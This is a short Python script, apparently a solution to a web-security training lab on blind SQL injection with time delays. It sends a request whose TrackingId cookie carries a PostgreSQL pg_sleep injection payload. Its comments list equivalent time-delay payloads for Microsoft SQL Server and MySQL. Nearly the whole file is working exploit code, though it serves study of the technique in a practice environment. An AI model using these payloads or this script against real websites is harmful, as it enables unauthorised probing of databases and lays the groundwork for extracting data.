import requests as r
from time import sleep
import string


# Lab name: Blind SQL injection with time delays

link = "https://0a93001c042462d7c047371300680036.web-security-academy.net"

cookie_name="TrackingId"


# I tested the following payload until i found the right one 


# microsoft:       cookie_user  +      \' || (waitfor delay \'0:0:10\')  || \'
#MySQL  :        cookie_user    +      \'   || SELECT SLEEP(10) || \'
#PostgreSQL:      cookie_user   +      \' || (select pg_sleep(10)) || \'


def create_delay(my_cookie):

    
    payload=my_cookie + "\' || (select pg_sleep(10)) || \' "

    my_res = r.get(link, cookies={cookie_name:payload})

    response = my_res.text

    print(payload) 
    
    # will get printed after the previous instruction have finish
    #  because our code is sequential
    






create_delay("4rNzL7xvPZNuWp1l")